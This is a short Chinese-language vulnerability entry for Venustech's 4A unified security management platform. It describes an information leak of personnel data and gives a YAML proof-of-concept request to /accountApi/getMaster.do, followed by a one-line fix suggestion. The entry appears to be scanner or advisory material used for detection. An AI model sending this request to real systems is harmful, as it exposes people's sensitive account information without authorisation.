漏洞描述：

启明星辰集团4A统一安全管控平台实现IT资源集中管理,为企业提供集中的账号、认证、授权、审计管理技术支撑及配套流程,提升系统安全性和可管理能力。可获取相关人员敏感信息。

```
poc:
  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /accountApi/getMaster.do
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/65.0.881.36 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("\"state\":true"))
```



修复建议：

限制文件访问